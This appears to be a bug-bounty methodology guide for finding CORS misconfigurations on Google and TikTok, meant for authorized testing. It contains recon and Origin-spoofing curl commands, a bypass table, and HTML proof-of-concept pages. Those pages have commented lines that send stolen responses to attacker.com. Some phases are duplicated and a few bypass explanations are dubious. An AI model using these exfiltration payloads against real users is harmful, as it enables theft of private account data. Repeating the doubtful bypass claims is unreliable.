# CORS Hunting Guide - Google VRP & TikTok

**Created:** 2026-06-06
**Focus:** CORS Misconfiguration on Google VRP and TikTok

---

## 🎯 Target Programs

### Google VRP (bughunters.google.com)
- **Platform:** Independent (Google)
- **Scope:** google.com, youtube.com, googleapis.com, cloud.google.com, blogger.com, etc.
- **Bounty:** $100-31337 (for CORS with significant impact)
- **Key Requirement:** Must demonstrate real impact, not just Origin reflection

### TikTok (HackerOne)
- **Platform:** HackerOne
- **Scope:** *.tiktok.com, *.bytedance.com (verify current scope at hackerone.com/tiktok)
- **Bounty:** $500-2500+
- **Key Requirement:** Must prove data exfiltration PoC

---

## 🔍 Google VRP - CORS Testing Methodology

### ⚠️ VRP Safe Harbor Notice
**IMPORTANT:** Testing Google VRP requires following their [VRP Safe Harbor provisions](https://bughunters.google.com/about/rules). Unauthorized testing may be illegal. Always stay within the program rules.

### Phase 1: Reconnaissance

```bash
# Find subdomains
amass enum -passive -d google.com -o google_subdomains.txt
subfinder -d google.com -o google_subdomains.txt

# Alternative: Use crt.sh
curl -s "https://crt.sh/?q=%.google.com&output=json" | jq -r '.[].name_value' | sort -u

# HIGH VALUE Google properties for CORS testing:
# - accounts.google.com      (OAuth, authentication)
# - plus.google.com          (Social platform - often CORS issues)
# - contacts.google.com      (Contact data APIs)
# - keep.google.com          (Notes/keeper data)
# - mail.google.com          (Email metadata)
# - drive.google.com         (File data)
# - calendar.google.com      (Calendar data)
# - blogger.com              (Blog platform APIs)
# - youtube.com              (Video platform APIs)
# - googleapis.com           (Various API endpoints)

# Known Google API patterns:
# - /_/widget/render/...     (Widget APIs)
# - /v1/accounts/...         (Account APIs)
# - /oauthtoken              (OAuth tokens)
# - /signin/...              (Sign-in flows)
```

### Phase 2: Header Testing

```bash
# Test for Origin reflection
curl -i "https://accounts.google.com" -H "Origin: https://evil.com" -H "Cookie: test"

# Look for:
# - Access-Control-Allow-Origin: https://evil.com
# - Access-Control-Allow-Credentials: true

# Test null origin (actual null, not string "null")
curl -i "https://accounts.google.com" -H "Origin: null"

# Test different bypass patterns (regex validation flaws):
# 1. Subdomain suffix attack
curl -i "https://accounts.google.com" -H "Origin: https://evil.google.com"

# 2. Bypass when only "google.com" whitelisted (not *.google.com)
curl -i "https://accounts.google.com" -H "Origin: https://google.com.evil.com"

# 3. Bypass with port preservation
curl -i "https://accounts.google.com" -H "Origin: https://evil.com:443@google.com"

# 4. Bypass with different subdomain
curl -i "https://accounts.google.com" -H "Origin: https://google.com.attacker.com"

# 5. Multiple dot testing
curl -i "https://accounts.google.com" -H "Origin: https://evildotgoogle.com"
```

### Phase 3: API Discovery

```bash
# Use browser DevTools to find APIs:
# 1. Open https://accounts.google.com
# 2. Open DevTools -> Network
# 3. Filter by XHR/Fetch
# 4. Look for API endpoints that return user data

# Common patterns:
# - /_/widget/render/...
# - /v1/accounts/...
# - /oauthtoken
# - /signin/...
```

### Phase 4: Impact Demonstration

For Google VRP, you MUST demonstrate impact. Example PoC:

```html
<!-- PoC for Google VRP CORS -->
<!DOCTYPE html>
<html>
<head><title>Google CORS PoC</title></head>
<body>
<h1>Google CORS Data Exfiltration PoC</h1>
<pre id="output">Testing...</pre>

<script>
async function testCORS() {
  const target = 'https://accounts.google.com'; // Target endpoint
  
  try {
    // Test with credentials
    const response = await fetch(target, {
      method: 'GET',
      credentials: 'include'
    });
    
    const data = await response.text();
    
    // If we can read the response, sensitive data is exposed
    document.getElementById('output').textContent = 
      'CORS Misconfiguration Found!\n' +
      'Length: ' + data.length + '\n' +
      'First 200 chars: ' + data.substring(0, 200);
      
    // In real attack, exfiltrate to attacker server:
    // fetch('https://attacker.com/steal?data=' + encodeURIComponent(data));
    
  } catch (error) {
    document.getElementById('output').textContent = 'Error: ' + error.message;
  }
}

testCORS();
</script>
</body>
</html>
```

### Important Notes for Google VRP:

1. **NO AUTOMATED SCANNING** - Will get you banned
2. **Use your own test accounts only**
3. **Document the exact impact** - What data can be accessed?
4. **Check VRP rules page** - https://bughunters.google.com/about/rules
5. **Focus on authenticated endpoints** - Not public APIs

---

## 🔍 TikTok - CORS Testing Methodology

### Phase 1: Scope Verification

```bash
# Verify current scope at:
# https://hackerone.com/tiktok -> Policy tab

# Common TikTok domains:
# - www.tiktok.com
# - api.tiktok.com
# - m.tiktok.com
# - tiktok.com
```

### Phase 2: Scope Verification

```bash
# Verify current scope at:
# https://hackerone.com/tiktok -> Policy tab

# Common TikTok domains:
# - www.tiktok.com
# - m.tiktok.com
# - tiktok.com
# - api.tiktok.com
# - vm.tiktok.com
```

### Phase 3: API Discovery

```bash
# Find TikTok API endpoints
# Use crt.sh for subdomains
curl -s "https://crt.sh/?q=%.tiktok.com&output=json" | jq -r '.[].name_value' | sort -u

# Use subfinder
subfinder -d tiktok.com -silent

# TikTok known API endpoints:
# - /api/v1/video/feed                    (Video feed)
# - /api/challenge/item_list              (Challenge/trending)
# - /api/user/info                        (User info)
# - /api/favorite/list                    (Favorites)
# - /api/comment/list                     (Comments)
# - /api/aweme/v1/aweme/post              (User posts)
# - /api/inbox/friends/                  (Inbox/friends)

# Check TikTok developer docs:
# https://developers.tiktok.com/
```

### Phase 4: CORS Header Testing

```bash
# Test TikTok main site
curl -i "https://www.tiktok.com" -H "Origin: https://evil.com"

# Test API endpoints
curl -i "https://api.tiktok.com/v1/video/feed" -H "Origin: https://evil.com"

# Look for:
# - Access-Control-Allow-Origin: * or reflected origin
# - Access-Control-Allow-Credentials: true
# - Vary: Origin header (indicates Origin is respected)
```

### Phase 5: Mobile API Testing

TikTok has extensive mobile APIs. Key areas:

```bash
# Video feed endpoints
curl -i "https://www.tiktok.com/api/v1/video/feed/" -H "Origin: https://evil.com"

# User-related endpoints
curl -i "https://www.tiktok.com/api/user/info/" -H "Origin: https://evil.com"

# Comment endpoints
curl -i "https://www.tiktok.com/api/comment/list/" -H "Origin: https://evil.com"
```

### Phase 5: Impact PoC

For TikTok, you must show data exfiltration:

```html
<!DOCTYPE html>
<html>
<head><title>TikTok CORS PoC</title></head>
<body>
<h1>TikTok CORS Exfiltration PoC</h1>

<script>
async function testTikTokCORS() {
  // Test TikTok API - use actual endpoint found during recon
  const endpoints = [
    'https://www.tiktok.com/api/user/',
    'https://api.tiktok.com/v1/user/info',
    // Add discovered endpoints
  ];
  
  for (const url of endpoints) {
    try {
      const response = await fetch(url, {
        method: 'GET',
        credentials: 'include'
      });
      
      if (response.ok) {
        const data = await response.text();
        console.log(`Vulnerable: ${url}`);
        console.log(`Data length: ${data.length}`);
        
        // In real attack:
        // navigator.sendBeacon('https://attacker.com/log', data);
      }
    } catch (e) {
      console.log(`Error at ${url}: ${e.message}`);
    }
  }
}
</script>
</body>
</html>
```

---

## 📋 CORS Finding Criteria

### For HIGH/Critical Bounty:

| Requirement | Description |
|-------------|-------------|
| **Origin Reflection** | Access-Control-Allow-Origin reflects user-controlled Origin |
| **Credentials** | Access-Control-Allow-Credentials: true |
| **Sensitive Data** | Endpoint returns user-specific data (PII, auth tokens, etc.) |
| **Impact** | Must demonstrate ability to exfiltrate data or perform unauthorized actions |

### NOT Eligible for Bounty (Informational only):

- Public endpoints without authentication
- Origin reflection on non-sensitive data
- Wildcard CORS without credentials
- Self-XSS without cross-origin impact

---

## 🛠️ Tools for CORS Testing

### Manual Testing Commands:

```bash
# 1. Basic Origin reflection check
curl -i https://target.com/api -H "Origin: https://evil.com"

# 2. Check for null origin allowance
curl -i https://target.com/api -H "Origin: null"

# 3. Check Vary: Origin header
curl -i https://target.com/api -H "Origin: https://test.com"
# If Vary: Origin is present, server respects Origin

# 4. Check credentials support
curl -i https://target.com/api -H "Origin: https://evil.com" -H "Cookie: session=test"
# Look for Access-Control-Allow-Credentials: true

# 5. Check for wildcard on sensitive endpoint
curl -i https://target.com/api/user -H "Origin: https://evil.com"
```

### Automated Scanning (use carefully):

```bash
# CORScanner (be careful with Google VRP - NO scanning)
# pip install corscanner
# corscanner -d target.com

# Nuclei CORS template
nuclei -t custom-cors.yaml -l targets.txt -v
```

---

## 📝 Report Template for CORS

```markdown
## Title
CORS Misconfiguration Allowing Data Exfiltration on [endpoint]

## Summary
[Describe the vulnerability and where it was found]

## Steps to Reproduce
1. Navigate to [URL]
2. Open DevTools -> Network tab
3. Observe request to [endpoint]
4. Notice Access-Control-Allow-Origin reflects Origin header

## PoC
[Include HTML PoC or curl commands]

## Impact
[Explain what data can be accessed and potential impact]

## Supporting Evidence
- Screenshot of request/response headers
- PoC video or animated GIF
- Evidence of authenticated endpoint being vulnerable

## Remediation
[Suggest how to fix the vulnerability]
```

---

## ⚠️ Important Reminders

1. **ALWAYS read the program policy before testing**
2. **NO automated scanning** - Especially for Google VRP (will get banned)
3. **Use only your own test accounts**
4. **Document everything thoroughly**
5. **Demonstrate real impact** - Not just header findings
6. **Check for existing reports** - Avoid duplicate findings
7. **Follow VRP Safe Harbor** - https://bughunters.google.com/about/rules

## 🔓 CORS Bypass Techniques (Regex Validation Flaws)

When testing, try these bypasses if initial test fails:

| Bypass Technique | Example Origin | Target Pattern | Why It Works |
|-----------------|----------------|----------------|--------------|
| Subdomain suffix | `https://google.com.attacker.com` | `*.google.com` | Regex allows suffix |
| Missing anchor | `https://google.com.evil.com` | `google.com` (no ^ anchor) | Matches at end |
| Port preservation | `https://evil.com:443@google.com` | `google.com` | Port stripped, domain preserved |
| Unicode spoofing | `https://google.com.evil.xn--` | `google.com` | Punycode confusion |
| Null origin | `null` | Allows null | Sandbox iframe exploitation (requires browser) |

---

**Last Updated:** 2026-06-06